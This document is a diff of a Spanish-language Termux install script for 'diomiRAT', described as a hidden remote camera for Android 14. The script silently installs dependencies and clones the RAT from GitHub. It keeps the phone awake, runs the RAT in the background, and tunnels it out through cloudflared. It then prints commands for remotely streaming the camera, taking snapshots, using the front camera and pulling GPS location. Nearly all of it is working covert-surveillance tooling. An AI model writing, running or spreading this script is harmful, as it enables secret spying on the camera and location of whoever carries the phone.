@@ -1,36 +1,48 @@
-d#!/bin/bash
-echo "Instalando/actualizando cámara remota oculta para Android 14..."
+#!/bin/bash
+echo "Instalando/actualizando diomiRAT para Android 14 (cámara oculta)..."
 
+# Actualizar paquetes
 pkg update -y >/dev/null 2>&1
 pkg upgrade -y >/dev/null 2>&1
-pkg install python termux-api opencv-python ffmpeg cloudflared wget -y >/dev/null 2>&1
 
+# Instalar dependencias
+pkg install python termux-api opencv-python ffmpeg cloudflared wget git -y >/dev/null 2>&1
+pip install flask pillow >/dev/null 2>&1
+
+# Clonar o actualizar repo
 cd $HOME
-if [ -d "android-cam-rat" ]; then
-    cd android-cam-rat && git pull --quiet
+if [ -d "diomiRAT" ]; then
+    cd diomiRAT && git pull --quiet
 else
-    git clone https://github.com/tuusuario/android-cam-rat.git >/dev/null 2>&1
-    cd android-cam-rat
+    git clone https://github.com/Diomi1/diomiRAT.git >/dev/null 2>&1
+    cd diomiRAT
 fi
 
+# Hacer ejecutable y matar procesos viejos
 chmod +x quickrat.py
+pkill -f quickrat.py >/dev/null 2>&1
+pkill -f cloudflared >/dev/null 2>&1
+
+# Mantener despierto y arrancar
 termux-wake-lock >/dev/null 2>&1
-
-# Matar procesos antiguos
-pkill -f quickrat.py
-pkill -f cloudflared
-
 sleep 2
-
 nohup python quickrat.py > /dev/null 2>&1 &
 nohup cloudflared tunnel --url http://localhost:5000 > tunnel.log 2>&1 &
 
-sleep 8
+# Esperar y mostrar enlace
+sleep 10
 echo ""
-echo "¡LISTO! Tu enlace permanente (guárdalo bien):"
-grep -a "https://*.trycloudflare.com" tunnel.log | tail -1 || echo "En 10 segundos más aparecerá aquí"
+echo "¡DIOMIRAT activado! Enlace permanente (guárdalo):"
+ENLACE=$(grep -o 'https://[^ ]*.trycloudflare.com' tunnel.log | head -1)
+if [ -n "$ENLACE" ]; then
+    echo "$ENLACE"
+else
+    echo "Revisa tunnel.log o espera 10s más."
+fi
 echo ""
-echo "Comandos desde tu PC:"
-echo "   Streaming: mpv https://tuyoenlace.trycloudflare.com/live"
-echo "   Foto:      curl https://tuyoenlace.trycloudflare.com/snapshot -o foto.jpg"
-echo "   Frontal:   curl https://tuyoenlace.trycloudflare.com/camera/1"
+echo "Comandos desde PC:"
+echo "  Streaming: mpv $ENLACE/live"
+echo "  Foto: curl $ENLACE/snapshot -o foto.jpg"
+echo "  Frontal: curl $ENLACE/camera/1"
+echo "  GPS: curl $ENLACE/location"
+echo ""
